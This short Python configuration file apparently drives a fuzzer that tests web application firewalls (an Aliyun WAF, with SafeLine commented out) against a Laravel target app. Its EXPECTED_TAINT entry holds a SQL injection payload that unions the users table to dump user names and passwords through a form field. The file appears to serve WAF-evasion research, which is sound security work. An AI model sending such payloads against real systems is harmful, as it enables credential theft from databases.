#WAF_HOST = "safeline.waf.server-config.zip"
WAF_HOST = "aliyun.waf.jianjunchen.com"
WAF_PORT = 80
WAF_NAME = "aliyun_strict"
#WAF_PORT = 31080
EXPECTED_TAINT = {
    "loc": "form",
    "taint_key": "taint",
    "taint_val": "1' union select 1,group_concat(user,0x3a,password) from users #"
}
APP_PORT = 15008
QUEUE_DIR = './fuzzing/queue'
SOLUTION_DIR = f"./fuzzing/solution/{WAF_NAME}/laravel"
DEBUG = False
WEBAPP_VALIDATE_CODE = 299
WAF_VALIDATE_CODE = 299
VALIDATE_MODE = "lax"
